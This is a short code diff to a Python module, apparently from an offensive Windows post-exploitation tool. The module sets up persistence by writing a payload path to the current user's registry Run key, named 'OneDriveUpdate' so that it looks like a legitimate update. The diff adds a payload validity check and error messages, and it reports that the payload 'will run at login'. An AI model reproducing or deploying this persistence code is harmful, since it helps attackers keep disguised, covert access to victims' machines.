@@ -1,5 +1,6 @@
 import os
 import _winreg
+import random
 from core.prints import *
 from core.utils import *
 
@@ -25,9 +26,13 @@ def reg_create(path,payload):
 		return True
 
 def hkcu_run(payload):
-	if (reg_create("Software\Microsoft\Windows\CurrentVersion\Run",payload) == True):
-		print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
-		print_success("Successfully installed persistence, payload will run at login")
+	if (payloads().exe(payload) == True):
+		if (reg_create("Software\Microsoft\Windows\CurrentVersion\Run",payload) == True):
+			print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
+			print_success("Successfully installed persistence, payload will run at login")
+		else:
+			print_error("Unable to install persistence")
+			return False
 	else:
-		print_error("Unable to install persistence")
-		return False
+		print_error("Cannot proceed, invalid payload")
+		return False								
